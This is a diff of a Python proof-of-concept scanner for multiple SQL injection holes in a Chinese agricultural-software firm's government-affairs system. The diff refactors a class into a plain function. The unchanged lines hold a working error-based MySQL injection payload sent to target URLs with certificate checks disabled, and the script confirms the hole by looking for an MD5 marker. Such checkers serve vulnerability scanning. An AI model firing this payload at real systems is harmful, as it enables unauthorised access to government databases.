@@ -10,14 +10,7 @@ description: 山东农友软件公司政务系统存在多处SQL注入漏洞。
 import sys
 import requests
 import warnings
-
-
-
-class nongyou_multi_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['农友政务系统多处SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -34,7 +27,7 @@ class nongyou_multi_sqli:
             noexist = True
             for turl in urls:
                 payload = "%27%20AnD%20%28SeLeCt%201%20FrOm%28SeLeCt%20CoUnT%28%2a%29%2CCoNcAt%28Md5%281234%29%2CFlOoR%28RaNd%280%29%2a2%29%29x%20FrOm%20InFOrMATiON_ScHeMA.CHaRaCTER_SeTS%20GrOuP%20By%20x%29a%29%20AnD%27svkA%27%3D%27svkA%26CountryName%3D1"
-                vulnurl = self.url + turl + payload
+                vulnurl = url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     result[2]=  '存在'
@@ -49,5 +42,4 @@ class nongyou_multi_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = nongyou_multi_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
